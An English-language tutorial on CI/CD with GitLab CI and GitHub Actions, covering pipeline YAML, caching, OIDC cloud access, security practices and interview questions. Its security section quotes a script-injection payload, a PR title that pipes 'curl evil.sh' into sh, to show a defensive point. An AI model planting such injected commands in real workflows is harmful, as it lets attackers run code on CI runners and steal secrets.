# CI/CD: GitLab CI and GitHub Actions

CI/CD in depth: concepts and principles, deployment strategies, how GitLab CI and GitHub Actions work, complete pipelines with every part explained, cache and artifacts, reuse, security and speed-ups. At the end — interview questions.

## Concepts

### CI, Continuous Delivery and Continuous Deployment
- **CI (Continuous Integration)** — developers merge their changes into a shared branch often (at least once a day), and **every change is automatically built and checked by tests**. The goal is to find integration problems immediately, while the change is small and fresh in your memory, rather than a month later during a big merge.
- **Continuous Delivery** — every change that has passed the checks is **ready to be released to production** at any moment: the artifact is built, the tests have passed, it has been rolled out to test environments. The production release is at the push of a button.
- **Continuous Deployment** — the next step: a change that has passed the checks **goes to production automatically**, without human involvement.

### Principles of a good pipeline
**1. Build once, deploy many.** The artifact (a Docker image) is built **once**, and the same image is promoted dev → stage → prod. Environments differ only in configuration (variables, values files). If you rebuild the image for each environment, something other than what was tested may end up in production (different dependency versions at build time).

**2. Fast feedback.** Cheap and fast checks go first (linters, unit tests — seconds), expensive and slow ones later (integration tests, scanning). A pipeline should fail as early as possible.

**3. Reproducibility.** Pinned versions of tool images and dependencies. The same commit gives the same result.

**4. Idempotency.** Re-running a job doesn't break anything. Deploying the same version a second time changes nothing.

**5. Pipeline as code.** The pipeline definition lives in the repository next to the code, goes through review and has history.

**6. Immutable artifacts with clear versions.** An image is tagged with the commit SHA and a semantic version for releases, not `latest`. You can always answer "what is in production right now" and roll back to a specific version.

### Deployment strategies
- **Rolling update** — gradually replace old instances with new ones (the default in Kubernetes). No extra resources, but for some time both versions run at once.
- **Recreate** — stop everything old, start the new. Simple, but with downtime. Needed when two versions cannot run at the same time.
- **Blue/Green** — two identical environments: blue (current) and green (new). The new version is deployed to green, verified, and then **all traffic is switched at once**. Rollback — switch back. The downside is double resources during the switch.
- **Canary** — the new version first gets a **small share of traffic** (5%), its metrics (errors, latency) are compared with the old version, then the share gradually grows. On degradation — an automatic rollback. Tools: Argo Rollouts, Flagger, weighted ALB target groups.
- **Feature flags** — the code of a new feature is already in production but **switched off** by a flag. It's switched on for some or all users without a deploy. It separates "ship the code" from "turn on the feature". Tools: LaunchDarkly, Unleash (flag management services with a UI and rules like "enable for 10% of users"), AWS AppConfig.

### Push versus pull (GitOps)
- **Push** — the CI pipeline itself goes to the cluster and applies the changes (`helm upgrade`, `kubectl apply`). Simple, but CI needs write access to the cluster and becomes an attack point.
- **Pull (GitOps)** — an agent **inside** the cluster (ArgoCD, Flux) watches a git repository with manifests and applies the changes itself. CI only builds the image and updates the tag in the configuration repository. More details in the GitOps topic.

### Pipeline security
- **OIDC instead of static keys** for cloud access (see below).
- **Protected and masked variables** — secrets are available only on protected branches and aren't printed in logs.
- **Least privilege** for runners and tokens.
- **Pinned versions** of third-party images and actions.
- **Scanning:** SAST (Static Application Security Testing — analysing source code for vulnerabilities without running it: SQL injections, unsafe functions), SCA (Software Composition Analysis — finding known vulnerabilities in third-party libraries by their versions), secret detection (gitleaks — finds keys and passwords accidentally committed to the repository), image scanning (Trivy), IaC scanning (checkov, trivy config).
- **Supply chain:** image signing (cosign), SBOM, provenance verification.

### 🧪 Mini task

**Task.** Simulate the fail-fast principle: write a three-stage "pipeline" (lint → test → build) in bash where the tests fail. See whether the build is reached and what exit code the pipeline returns.

<details class="qa"><summary>Solution: command and expected output</summary>

Paste the whole block into a terminal:

```bash
cd "$(mktemp -d)"
cat > pipeline.sh <<'EOF'
set -e
stage() { echo "== $1"; shift; "$@"; }
stage lint  true
stage test  sh -c 'echo "1 test failed"; exit 1'
stage build echo "image built"
EOF
bash pipeline.sh; echo "pipeline exit=$?"
```

Expected output:

```text
== lint
== test
1 test failed
pipeline exit=1
```

Breakdown: a CI system, just like `set -e`, decides everything by exit code: non-zero means the job is red and later stages don't run. The build never started, so no image from broken code went anywhere. Two rules of a good pipeline follow: cheap, fast checks (lint, unit tests) go first, and job scripts must honestly return a non-zero code on error.

</details>

## GitLab CI

### Core concepts
- **Pipeline** — one run of the whole process for a commit, MR or tag. Described in the `.gitlab-ci.yml` file at the repository root.
- **Stage** — a phase (lint, test, build, deploy). Stages run **sequentially**: the next one starts when all jobs of the previous one have succeeded.
- **Job** — a task within a stage: a set of commands executed in an isolated environment. Jobs of one stage run **in parallel**.
- **Runner** — the agent that executes jobs. There are shared runners (from GitLab.com), group runners and project runners. The **executor** defines where a job runs: in a Docker container (`docker`), in a Kubernetes pod (`kubernetes`), directly on the machine (`shell`). A job picks a runner by **tags**.

### A minimal pipeline with explanations
```yaml
stages:          # the order of stages
  - test
  - build

unit-tests:      # the job name (any)
  stage: test
  image: python:3.12-slim          # the job runs in a container from this image
  script:                          # the commands; if any returns a non-zero code the job fails
    - pip install -r requirements.txt
    - pytest -q

build-image:
  stage: build                     # runs only if all jobs of the test stage passed
  image: docker:27
  services:
    - docker:27-dind               # an extra container with the Docker daemon (Docker-in-Docker)
  script:
    - docker build -t $CI_REGISTRY_IMAGE:$CI_COMMIT_SHORT_SHA .
```

### Predefined variables
GitLab passes dozens of context variables into every job:
- `CI_COMMIT_SHA`, `CI_COMMIT_SHORT_SHA` — the commit hash (for image tags);
- `CI_COMMIT_BRANCH`, `CI_COMMIT_TAG`, `CI_COMMIT_REF_NAME` — the branch or tag;
- `CI_DEFAULT_BRANCH` — the main branch (usually `main`);
- `CI_PIPELINE_SOURCE` — what started the pipeline: `push`, `merge_request_event`, `schedule`, `web` (button), `api`, `trigger`;
- `CI_MERGE_REQUEST_IID` — the MR number;
- `CI_REGISTRY`, `CI_REGISTRY_IMAGE`, `CI_REGISTRY_USER`, `CI_REGISTRY_PASSWORD` — the built-in Container Registry;
- `CI_JOB_TOKEN` — a temporary job token for access to the API and other projects.

Your own variables are set in `variables:` in the file or in the project and group settings (**Settings → CI/CD → Variables**) — that's where secrets are kept, with flags:
- **Masked** — the value is replaced with `[MASKED]` in logs;
- **Protected** — available only in jobs on protected branches and tags. That way production secrets don't end up in a pipeline from an arbitrary branch.

### When a job runs: rules
`rules` is a list of conditions checked **top to bottom**; the **first** matching rule wins:
```yaml
deploy-prod:
  script: ./deploy.sh prod
  rules:
    - if: $CI_PIPELINE_SOURCE == "merge_request_event"
      when: never                              # never in MR pipelines
    - if: $CI_COMMIT_BRANCH == $CI_DEFAULT_BRANCH
      when: manual                             # on main — via a button
    - when: never                              # in all other cases — no
```
`when` values: `on_success` (the default — if the previous stages succeeded), `manual` (via a button), `always` (even if the previous ones failed — for example, collecting reports), `never`, `delayed` (with a `start_in` delay).

Other conditions:
```yaml
rules:
  - changes:                         # only if these files changed
      - src/**/*
      - Dockerfile
  - exists:
      - Dockerfile                   # only if the file exists in the repository
```
The old `only/except` syntax is deprecated; `rules` replaces it.

**`workflow: rules`** — conditions for **the whole pipeline**: whether to create it at all. A typical task is not running two pipelines (on a push to the branch and on the MR) at the same time:
```yaml
workflow:
  rules:
    - if: $CI_PIPELINE_SOURCE == "merge_request_event"    # the pipeline for an MR
    - if: $CI_COMMIT_BRANCH && $CI_OPEN_MERGE_REQUESTS
      when: never                                         # a push to a branch with an open MR — don't duplicate
    - if: $CI_COMMIT_BRANCH == $CI_DEFAULT_BRANCH         # main
    - if: $CI_COMMIT_TAG                                  # tags (releases)
```

### needs — don't wait for the whole stage (DAG)
By default a job waits for the **entire** previous stage. `needs` lets it start right after specific jobs, building a dependency graph (DAG):
```yaml
build-api:
  stage: build
  needs: [test-api]          # starts as soon as test-api has passed, without waiting for test-web
build-web:
  stage: build
  needs: [test-web]
lint:
  stage: test
  needs: []                  # an empty list — start immediately when the pipeline is created
```
In a monorepo with several services this noticeably speeds up the pipeline.

### Cache and artifacts — what's the difference
This is a frequent question.

**Cache** is for **speed**: downloaded dependencies (NuGet, npm, pip packages) that can be reused between runs.
- Not guaranteed: it may be missing (a different runner, the cache was cleared), and the job must work without it.
- Lives between pipelines.

**Artifacts** are a job's **result**, needed by the next jobs or by people: built binaries, test reports, a Terraform plan.
- Guaranteed to be passed to the jobs of later stages of this pipeline.
- Downloadable in the UI, with a retention period.

```yaml
test:
  image: mcr.microsoft.com/dotnet/sdk:8.0
  variables:
    NUGET_PACKAGES: $CI_PROJECT_DIR/.nuget/packages   # packages go inside the project so they can be cached
  cache:
    key:
      files: [src/packages.lock.json]   # the cache key is the hash of the lock file: dependencies changed → a new cache
    paths: [.nuget/packages]
  script:
    - dotnet test --logger "junit;LogFilePath=../report.xml"
  artifacts:
    when: always                        # keep the report even if the tests failed
    expire_in: 1 week
    reports:
      junit: report.xml                 # GitLab shows the test results right in the MR
```

### Environments, manual deployments, protection from parallel deployments
```yaml
deploy-prod:
  stage: deploy
  environment:
    name: production                    # GitLab keeps a history of deployments to the environment and shows what is deployed now
    url: https://app.example.com
  resource_group: production            # no more than one prod deployment at a time — the rest wait in a queue
  rules:
    - if: $CI_COMMIT_BRANCH == $CI_DEFAULT_BRANCH
      when: manual
  script:
    - ./deploy.sh
```
**Protected environments** — allow deployments to `production` only to certain people or groups. **Review apps** — a temporary environment per MR (`environment: name: review/$CI_COMMIT_REF_SLUG` with `on_stop` — a job to delete it).

### Reusing pipeline code
**`extends`** — inherit the settings of a template (a job whose name starts with a dot is hidden and doesn't run by itself):
```yaml
.dotnet-base:
  image: mcr.microsoft.com/dotnet/sdk:8.0
  before_script:
    - dotnet restore

test:
  extends: .dotnet-base
  script: dotnet test
```
**`include`** — pull in configuration from other files, projects or GitLab templates:
```yaml
include:
  - local: ci/build.yml                         # a file from this same repository
  - project: platform/ci-templates              # a file from another project
    ref: v3.2.0                                 # ALWAYS pin the version
    file: /templates/dotnet.yml
  - template: Jobs/SAST.gitlab-ci.yml           # GitLab's built-in templates
  - component: gitlab.com/org/components/docker-build@1.4   # a CI/CD Component from the catalog
```
**`!reference`** — reuse a single section of another job: `script: [!reference [.setup, script], ./run.sh]`.

**CI/CD Components** — versioned, parameterised templates with a catalog. The modern way to build a shared pipeline library for a company: service teams include a component in one line and set a couple of parameters.

### Parent-child and multi-project pipelines
- **Parent-child** (`trigger: include: path/to/child.yml`) — the main pipeline starts child pipelines from files in the same repository. For a monorepo: each service has its own pipeline file, which runs only if the service changed.
- **Multi-project** (`trigger: project: group/other-repo`) — start a pipeline in another project. For example, after building an image, start a deployment from the configuration repository.

### A full example: build, Terraform and deployment to EKS
```yaml
workflow:
  rules:
    - if: $CI_PIPELINE_SOURCE == "merge_request_event"
    - if: $CI_COMMIT_BRANCH == $CI_DEFAULT_BRANCH
    - if: $CI_COMMIT_TAG

stages: [lint, test, build, plan, deploy]

variables:
  IMAGE: $CI_REGISTRY_IMAGE:$CI_COMMIT_SHORT_SHA     # an immutable tag — the commit SHA
  TF_ROOT: infra/envs/prod

default:
  interruptible: true          # if a new commit arrives in the branch — cancel the outdated pipeline

include:
  - template: Jobs/SAST.gitlab-ci.yml                # scanning the code for vulnerabilities

# --- a template for .NET jobs ---
.dotnet:
  image: mcr.microsoft.com/dotnet/sdk:8.0
  variables:
    NUGET_PACKAGES: $CI_PROJECT_DIR/.nuget/packages
  cache:
    key:
      files: [src/packages.lock.json]
    paths: [.nuget/packages]

unit-tests:
  extends: .dotnet
  stage: test
  script:
    - dotnet test --logger "junit;LogFilePath=../report.xml"
  artifacts:
    when: always
    reports:
      junit: report.xml

build-image:
  stage: build
  image: docker:27
  services: [docker:27-dind]
  script:
    - echo "$CI_REGISTRY_PASSWORD" | docker login -u "$CI_REGISTRY_USER" --password-stdin "$CI_REGISTRY"
    - docker build --cache-from "$CI_REGISTRY_IMAGE:latest" -t "$IMAGE" .
    - docker push "$IMAGE"
  rules:
    - if: $CI_COMMIT_BRANCH == $CI_DEFAULT_BRANCH       # on main — always
    - if: $CI_PIPELINE_SOURCE == "merge_request_event"
      changes: [src/**/*, Dockerfile]                   # in an MR — only if the code changed

tf-plan:
  stage: plan
  image:
    name: hashicorp/terraform:1.9
    entrypoint: [""]                    # the terraform image has ENTRYPOINT = terraform; reset it so the script runs
  id_tokens:
    AWS_TOKEN:                          # GitLab gives the job an OIDC token with this audience
      aud: sts.amazonaws.com
  variables:
    AWS_ROLE_ARN: $PLAN_ROLE_ARN        # the AWS SDK and the Terraform provider exchange the token for temporary role credentials themselves
    AWS_WEB_IDENTITY_TOKEN_FILE: /tmp/web-identity-token
  before_script:
    - echo "$AWS_TOKEN" > /tmp/web-identity-token
  script:
    - cd "$TF_ROOT"
    - terraform init -input=false
    - terraform plan -out=tfplan -input=false
  artifacts:
    paths: [$TF_ROOT/tfplan]            # the plan is passed to the apply job — exactly what was reviewed gets applied
    expire_in: 1 week
  resource_group: tf-prod

deploy-prod:
  stage: deploy
  image: alpine/k8s:1.30.4              # an image with kubectl, helm, aws cli
  needs: [build-image, tf-plan]
  environment:
    name: production
    url: https://app.example.com
  resource_group: production
  script:
    - helm upgrade --install app ./chart -n app --set image.tag=$CI_COMMIT_SHORT_SHA --atomic --wait --timeout 5m
    # --atomic: if the rollout doesn't succeed within the timeout — automatic rollback to the previous revision
  rules:
    - if: $CI_COMMIT_BRANCH == $CI_DEFAULT_BRANCH
      when: manual
```

### Other things worth knowing about GitLab
- **Merge request pipelines** — pipelines in the context of an MR. **Merged results pipelines** — they check the result of merging the branch with the current main, not the branch itself. **Merge trains** — a queue of MRs, each checked on top of the previous ones in the queue: main never breaks because two incompatible MRs were merged at the same time.
- `retry:` — automatic retry on certain failures: `retry: { max: 2, when: [runner_system_failure, stuck_or_timeout_failure] }`.
- `timeout:` — a job time limit.
- `allow_failure: true` — a failing job doesn't fail the pipeline (for optional checks).
- `parallel: N` — split a job into N copies (for example, tests in parts); `parallel: matrix:` — a parameter matrix.
- **Scheduled pipelines** — a pipeline on a schedule (nightly tests, Terraform drift checks).

### 🧪 Mini task

**Task.** Parse a `.gitlab-ci.yml` with a YAML anchor for shared settings (the anchor `&name` marks a block, and `<<: *name` inserts a copy of it elsewhere — this is how YAML avoids repetition) and `needs`: for each job print the stage, the final image after the anchor is expanded and what it depends on. Which jobs start in parallel, and will `test-api` wait for `build-web`?

<details class="qa"><summary>Solution: command and expected output</summary>

Paste the whole block into a terminal:

```bash
cd "$(mktemp -d)"
cat > .gitlab-ci.yml <<'EOF'
.job_defaults: &job_defaults
  image: python:3.12
  retry: 2

stages: [build, test, deploy]

build-api:
  <<: *job_defaults
  stage: build
  script: [make api]

build-web:
  <<: *job_defaults
  stage: build
  script: [make web]

test-api:
  <<: *job_defaults
  stage: test
  needs: [build-api]
  script: [pytest]

deploy:
  stage: deploy
  image: alpine:3.20
  needs: [test-api]
  script: [./deploy.sh]
  rules:
    - if: $CI_COMMIT_BRANCH == "main"
EOF
yq 'explode(.) | to_entries | .[]
    | select((.value | tag) == "!!map" and (.value | has("stage")))
    | [.key, .value.stage, .value.image, ((.value.needs // ["-"]) | join(","))] | @tsv' .gitlab-ci.yml
```

Expected output:

```text
build-api	build	python:3.12	-
build-web	build	python:3.12	-
test-api	test	python:3.12	build-api
deploy	deploy	alpine:3.20	test-api
```

Breakdown: `explode` expanded the `<<: *job_defaults` anchor, so three jobs got `python:3.12`, while `deploy` overrode the image with its own. The hidden `.job_defaults` job (with a dot) never runs and isn't in the output because it has no `stage`. Both builds start in parallel. Thanks to `needs: [build-api]`, `test-api` starts right after `build-api` without waiting for `build-web` — that's the DAG. Without `needs` it would wait for the whole `build` stage. Because of `rules`, `deploy` only appears in pipelines for the `main` branch.

</details>

## GitHub Actions

### Core concepts
- **Workflow** — a `.github/workflows/<name>.yml` file. There can be many, each with its own triggers.
- **Event (on)** — what starts a workflow: a push, a pull request, a schedule, a manual run, a call from another workflow.
- **Job** — a task on a separate **runner** (a virtual machine or container). **Jobs run in parallel** unless a dependency is specified via `needs`.
- **Step** — a step within a job: either a shell command (`run`) or a ready-made action (`uses`). Steps of one job run sequentially on the same machine and share the filesystem.
- **Action** — a reusable step from the marketplace or your own repository: `actions/checkout`, `docker/build-push-action`.
- **Runner** — GitHub-hosted (GitHub's virtual machines: `ubuntu-latest`, `windows-latest`, `macos-latest`) or self-hosted (your own machines; in Kubernetes — **Actions Runner Controller**, ARC).

### Mapping GitLab and GitHub terms
| GitLab CI | GitHub Actions |
|---|---|
| `.gitlab-ci.yml` (one file + include) | `.github/workflows/*.yml` (many independent workflows) |
| pipeline → stages → jobs | workflow → jobs → steps |
| stages run sequentially, `needs` for a DAG | jobs run in parallel, ordering via `needs` |
| `rules`, `workflow: rules` | `on:` (events) and `if:` (conditions) |
| `extends`, `include`, CI/CD Components | reusable workflows, composite actions |
| `cache`, `artifacts` | `actions/cache`, `actions/upload-artifact` / `download-artifact` |
| `environment` + `when: manual` | `environment` + required reviewers |
| CI/CD Variables (masked, protected) | Secrets and Variables (levels: repository, environment, organisation) |
| `parallel: matrix` | `strategy: matrix` |
| `id_tokens` (OIDC) | `permissions: id-token: write` (OIDC) |
| `resource_group` | `concurrency` |
| `interruptible` | `concurrency.cancel-in-progress` |

### Events (on)
```yaml
on:
  push:
    branches: [main]
    tags: ["v*"]
    paths: ["src/**", "Dockerfile"]   # only if these files changed
  pull_request:                       # a PR into any branch
  schedule:
    - cron: "0 3 * * 1"               # on Mondays at 03:00 UTC
  workflow_dispatch:                  # the "Run workflow" button in the UI, optionally with parameters
    inputs:
      environment:
        type: choice
        options: [stage, prod]
  workflow_call:                      # this workflow can be called from others (reusable)
```
**`pull_request` and `pull_request_target` — an important security difference:**
- `pull_request` from a **fork** runs **without access to secrets** and with a read-only token. Safe: someone else's code can't steal the secrets.
- `pull_request_target` runs in the context of the **base** repository **with secrets**. If you check out the PR's code in it and run it (build, tests), the PR's author can steal all the secrets. Use it only for actions that don't execute the PR's code (adding a label, leaving a comment).

### A full example: tests, building an image into ECR, deployment with approval
```yaml
name: ci

on:
  pull_request:
  push:
    branches: [main]
  workflow_dispatch:

permissions:
  contents: read            # minimal GITHUB_TOKEN permissions by default for all jobs

concurrency:
  group: ${{ github.workflow }}-${{ github.ref }}   # one "queue" per branch
  cancel-in-progress: true                          # a new commit cancels the outdated run

jobs:
  test:
    runs-on: ubuntu-latest
    strategy:
      fail-fast: false                    # don't cancel the other matrix variants when one fails
      matrix:
        dotnet: ["8.0.x", "9.0.x"]        # the job runs twice — once for each version
    steps:
      - uses: actions/checkout@v4         # download the repository code onto the runner
      - uses: actions/setup-dotnet@v4
        with:
          dotnet-version: ${{ matrix.dotnet }}
          cache: true
          cache-dependency-path: src/packages.lock.json
      - run: dotnet test

  build:
    needs: test                           # only after successful tests
    if: github.event_name == 'push'       # only on a push to main, not in a PR
    runs-on: ubuntu-latest
    permissions:
      id-token: write                     # allow getting an OIDC token for AWS
      contents: read
    outputs:
      tag: ${{ steps.meta.outputs.tag }}  # pass a value to the next jobs
    steps:
      - uses: actions/checkout@v4
      - uses: aws-actions/configure-aws-credentials@v4
        with:
          role-to-assume: arn:aws:iam::123456789012:role/gha-ecr-push
          aws-region: us-east-2           # no keys: the OIDC token is exchanged for temporary credentials
      - id: ecr
        uses: aws-actions/amazon-ecr-login@v2
      - id: meta
        run: echo "tag=${GITHUB_SHA::7}" >> "$GITHUB_OUTPUT"   # write a step output
      - uses: docker/setup-buildx-action@v3
      - uses: docker/build-push-action@v6
        with:
          push: true
          tags: ${{ steps.ecr.outputs.registry }}/app:${{ steps.meta.outputs.tag }}
          cache-from: type=gha            # Docker layer cache in the GitHub Actions cache
          cache-to: type=gha,mode=max

  deploy-prod:
    needs: build
    runs-on: ubuntu-latest
    environment: production               # if the environment has required reviewers — waits for approval
    steps:
      - run: echo "Deploying version ${{ needs.build.outputs.tag }}"
```

### Passing data
- **Between steps of one job** — a step output: `echo "name=value" >> "$GITHUB_OUTPUT"`, then `${{ steps.<id>.outputs.name }}`. Environment variables for subsequent steps: `echo "VAR=value" >> "$GITHUB_ENV"`. Files on disk are available too (same machine).
- **Between jobs** — each job runs on a **separate** machine, there's no shared disk. Small values are passed via the job's `outputs` and `needs.<job>.outputs.<name>`. Files — via `actions/upload-artifact` and `actions/download-artifact`.

### Expressions and contexts
`${{ }}` are expressions. Contexts: `github` (the event, branch, SHA, author), `env`, `vars`, `secrets`, `matrix`, `needs`, `steps`, `runner`, `inputs`.
```yaml
if: github.ref == 'refs/heads/main' && github.event_name == 'push'
if: failure()                 # the step runs only if something failed (a notification)
if: always()                  # runs in any case (collecting reports)
if: contains(github.event.head_commit.message, '[skip tests]') == false
```

### Reuse
**Reusable workflow** — a whole workflow with jobs that other workflows call:
```yaml
# in the org/platform repository: .github/workflows/deploy.yml
on:
  workflow_call:
    inputs:
      environment: { type: string, required: true }
    secrets:
      KUBECONFIG_B64: { required: true }
jobs:
  deploy:
    runs-on: ubuntu-latest
    environment: ${{ inputs.environment }}
    steps:
      - run: echo "deploy to ${{ inputs.environment }}"
```
```yaml
# in the service repository
jobs:
  deploy-stage:
    uses: org/platform/.github/workflows/deploy.yml@v1   # a pinned version
    with:
      environment: stage
    secrets: inherit                                      # pass all of the caller's secrets
```
**Composite action** — a set of **steps** packaged as one action (an `action.yml` file with `runs: using: composite`). It's used inside a job like an ordinary step. The difference: a reusable workflow is whole jobs (with their own runners), a composite action is steps inside a job.

### Security in GitHub Actions
- **`permissions`** — minimal `GITHUB_TOKEN` permissions at the workflow or job level (by default in older repositories the token may have write access to everything).
- **Pin third-party actions by the full commit SHA**, not by tag: a tag can be moved to malicious code (such attacks on popular actions have already happened). `uses: some/action@a1b2c3d4...` instead of `@v2`.
- **Script injection.** Never substitute user-controlled data directly into `run`:
  ```yaml
  # DANGEROUS: a PR title like  "; curl evil.sh | sh #  gets executed as a command
  - run: echo "PR title is ${{ github.event.pull_request.title }}"
  # SAFE: via an environment variable — the value isn't interpreted as code
  - env:
      TITLE: ${{ github.event.pull_request.title }}
    run: echo "PR title is $TITLE"
  ```
- Environment secrets with mandatory approval for prod.
- Don't use self-hosted runners for public repositories: any PR could run code on your machine.

### 🧪 Mini task

**Task.** A workflow defines a matrix: two `os` values × three Python versions, with one combination removed via `exclude`. Work out how many jobs GitHub Actions will start and print the list.

<details class="qa"><summary>Solution: command and expected output</summary>

Paste the whole block into a terminal:

```bash
cd "$(mktemp -d)"
cat > ci.yml <<'EOF'
on: [push]
jobs:
  test:
    runs-on: ${{ matrix.os }}
    strategy:
      fail-fast: false
      matrix:
        os: [ubuntu-latest, macos-latest]
        python: ["3.11", "3.12", "3.13"]
        exclude:
          - os: macos-latest
            python: "3.11"
    steps:
      - uses: actions/checkout@v4
      - uses: actions/setup-python@v5
        with:
          python-version: ${{ matrix.python }}
      - run: pytest -q
EOF
yq -o=json '.jobs.test.strategy.matrix' ci.yml | python3 -c '
import itertools, json, sys
m = json.load(sys.stdin)
ex = m.pop("exclude", [])
combos = [dict(zip(m, v)) for v in itertools.product(*m.values())]
combos = [c for c in combos if not any(all(c[k] == e[k] for k in e) for e in ex)]
for c in combos:
    print(c["os"], c["python"])
print(len(combos), "jobs")'
```

Expected output:

```text
ubuntu-latest 3.11
ubuntu-latest 3.12
ubuntu-latest 3.13
macos-latest 3.12
macos-latest 3.13
5 jobs
```

Breakdown: a matrix is the Cartesian product of all axes: 2 × 3 = 6, minus one excluded combination = 5 parallel jobs. The script reproduces exactly that logic. `fail-fast: false` keeps one failing combination from cancelling the rest — otherwise you can't tell whether only macOS breaks or everything does. The Python versions are quoted for a reason: unquoted, YAML would read `3.10` as the number `3.1`.

</details>

## Cloud access from CI: OIDC
**The problem.** Long-lived AWS keys (`AWS_ACCESS_KEY_ID`) in CI variables can leak (logs, a compromised runner, a former employee), and they have to be rotated manually.

**The solution — OIDC (OpenID Connect).**
1. An **Identity Provider** is registered once in AWS IAM — GitLab (`gitlab.com`) or GitHub (`token.actions.githubusercontent.com`).
2. An IAM role is created with a **trust policy**: "this role can be assumed with a token from this provider, but only if the token names such-and-such project and branch".
3. On every run, CI gives the job a **signed token** with information: the project, branch, environment.
4. The job exchanges the token for **temporary credentials** of the role (`AssumeRoleWithWebIdentity`), valid for about an hour.

```json
{
  "Effect": "Allow",
  "Principal": { "Federated": "arn:aws:iam::123456789012:oidc-provider/gitlab.com" },
  "Action": "sts:AssumeRoleWithWebIdentity",
  "Condition": {
    "StringEquals": { "gitlab.com:aud": "sts.amazonaws.com" },
    "StringLike":   { "gitlab.com:sub": "project_path:mygroup/infra:ref_type:branch:ref:main" }
  }
}
```
The condition on `sub` is key: without it **any** project on gitlab.com could assume the role.

### 🧪 Mini task

**Task.** Build a training GitLab ID token (a JWT — JSON Web Token: signed JSON with statements about who received it) with a `sub` claim (a statement field inside the token) for the `main` branch, decode its payload and check which `StringLike` conditions from an AWS role's trust policy let it through: the exact one, "the whole project" and "someone else's project".

<details class="qa"><summary>Solution: command and expected output</summary>

Paste the whole block into a terminal:

```bash
payload='{"iss":"https://gitlab.com","aud":"sts.amazonaws.com","sub":"project_path:mygroup/app:ref_type:branch:ref:main","ref_protected":"true"}'
token="e30.$(printf '%s' "$payload" | base64 | tr -d '=\n' | tr '/+' '_-').sig"
echo "$token" | cut -d. -f2 | python3 -c '
import base64, fnmatch, json, sys
p = sys.stdin.read().strip()
claims = json.loads(base64.urlsafe_b64decode(p + "=" * (-len(p) % 4)))
print(claims["aud"], claims["sub"])
for pattern in ["project_path:mygroup/app:ref_type:branch:ref:main",
                "project_path:mygroup/*",
                "project_path:other/app:*"]:
    print(fnmatch.fnmatch(claims["sub"], pattern), pattern)'
```

Expected output:

```text
sts.amazonaws.com project_path:mygroup/app:ref_type:branch:ref:main
True project_path:mygroup/app:ref_type:branch:ref:main
True project_path:mygroup/*
False project_path:other/app:*
```

Breakdown: a JWT is three dot-separated parts, and the payload is just base64url JSON that anyone can read. What protects it is the signature, which AWS verifies against the `iss` keys. The role trusts the token if `aud` and `sub` match the trust policy conditions. The exact condition admits only `main` of this project. `project_path:mygroup/*` admits any project in the group and any branch, including someone's feature branch — so anyone with push rights could deploy to prod. That's why the condition pins the project and a protected branch or environment.

</details>

## How to speed up a pipeline
- **Dependency cache** keyed by the lock file.
- **Docker layer cache** (BuildKit `--cache-from/--cache-to` in a registry or the CI cache) and the right order of instructions in the Dockerfile.
- **Parallelism**: `needs` (DAG), independent jobs at the same time, tests split into parts (`parallel`, matrix).
- **Run only what's needed**: `rules: changes` / `paths` — don't build a service that didn't change.
- **Cancel outdated runs**: `interruptible` in GitLab, `concurrency.cancel-in-progress` in GitHub.
- **A light checkout**: a shallow clone (`GIT_DEPTH` in GitLab, `fetch-depth: 1` in GitHub).
- **Ready-made images** with the needed tools instead of installing them on every run.
- **Enough runners**: if jobs wait in a queue for a long time, the problem isn't the pipeline but capacity (autoscaling runners in Kubernetes).

### 🧪 Mini task

**Task.** Make a dependency cache key from the hash of `requirements.txt`, the way `cache:key:files` in GitLab or `hashFiles()` in GitHub Actions does. Check that changing the code doesn't change the key, while changing the dependencies does.

<details class="qa"><summary>Solution: command and expected output</summary>

Paste the whole block into a terminal:

```bash
cd "$(mktemp -d)"
echo 'requests==2.32.3' > requirements.txt
key() { echo "pip-$(shasum -a 256 requirements.txt | cut -c1-12)"; }
k1=$(key)
echo "print('v2')" > app.py; k2=$(key)
echo 'boto3==1.35.0' >> requirements.txt; k3=$(key)
[ "$k1" = "$k2" ] && echo "code changed: same cache key"
[ "$k1" != "$k3" ] && echo "deps changed: new cache key"
```

Expected output:

```text
code changed: same cache key
deps changed: new cache key
```

Breakdown: the key depends only on the lock file, so ordinary code commits hit the cache and don't download dependencies again, while a dependency change honestly rebuilds it. If the key were the branch name or the pipeline number, the cache would either always miss or serve stale packages. Other speed-ups from the section: `needs`, parallel jobs, Docker layers with dependencies before code, `rules:changes` for monorepos.

</details>

## Interview questions

**How does Continuous Delivery differ from Continuous Deployment?**
In both cases every change is checked automatically and is ready to be released. With Delivery the production release is manual, at the push of a button; with Deployment it's automatic, without human involvement.

**How do you set up a pipeline for a monorepo with 10 services?**
Build and test only the changed services: in GitLab — `rules: changes` and parent-child pipelines (each service has its own file); in GitHub — `paths` filters or an action that detects changed paths, plus a matrix over services. Shared logic — in versioned templates (CI/CD Components, reusable workflows). Dependencies between services — via `needs`.

**How do you speed up a pipeline?**
Dependency and Docker layer caches, parallel jobs via `needs`, splitting tests, running only what changed, cancelling outdated pipelines, a shallow clone, ready-made images with tools, enough runners.

**How do you deploy to AWS without storing keys in CI?**
OIDC: an Identity Provider in IAM, a role with a trust policy restricted by project and branch (`sub`), and the job exchanges the CI token for temporary credentials. Separate roles for different jobs (plan read-only, apply and deploy write access only from main).

**How does cache differ from artifacts?**
Cache is for speed, isn't guaranteed and is reused between pipelines (dependencies). Artifacts are a job's result, guaranteed to be passed to the next stages of this pipeline and downloadable (binaries, reports, a Terraform plan).

**How do you prevent an MR from a fork from stealing secrets?**
In GitLab — protected variables available only on protected branches, and approval of pipeline runs for external contributors. In GitHub — secrets aren't passed to `pull_request` from forks; don't use `pull_request_target` with a checkout and execution of the PR's code; minimal `permissions`.

**How do you do a rollback?**
Artifacts are immutable and versioned (tag = commit SHA), so a rollback is redeploying the previous version: `helm rollback`, `kubectl rollout undo`, reverting the commit in the configuration repository with GitOps. Database migrations must be backward compatible (expand/contract), otherwise rolling the code back breaks on the new schema.

**The pipeline failed on a flaky test. What do you do?**
In the short term — a retry (`retry`), but only for infrastructure failures. A flaky test is a bug: open a ticket, isolate the test (quarantine), find the cause (dependence on time, order, an external service, shared data). Otherwise the team stops trusting a red pipeline.

**How do you tag images?**
Immutable tags: the commit SHA for every build, a semantic version from the git tag for releases. `latest` in production is an anti-pattern: it's unclear what is deployed, and a rollback is impossible. For a guarantee — pinning by digest.

**How do you organise promotion between environments?**
One image for all environments (build once). Dev — automatically after merge, stage — automatically or by tag, prod — with manual approval (protected environment, required reviewers). Environment differences are only in configuration (values files, overlays).

**How do you prevent simultaneous deployments to the same environment?**
